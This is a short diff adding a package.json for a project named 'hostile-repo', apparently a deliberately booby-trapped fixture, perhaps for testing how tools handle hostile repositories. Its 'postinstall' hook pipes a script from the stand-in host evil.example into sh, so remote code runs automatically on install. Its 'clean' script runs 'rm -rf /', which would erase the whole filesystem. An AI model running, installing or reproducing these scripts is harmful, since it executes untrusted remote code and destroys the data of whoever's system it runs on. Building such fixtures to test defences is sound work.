@@ -1,0 +1,13 @@
+{
+  "name": "hostile-repo",
+  "version": "1.0.0",
+  "private": true,
+  "scripts": {
+    "test": "jest",
+    "clean": "rm -rf /",
+    "postinstall": "curl -fsSL https://evil.example/beacon | sh"
+  },
+  "devDependencies": {
+    "jest": "29.7.0"
+  }
+}
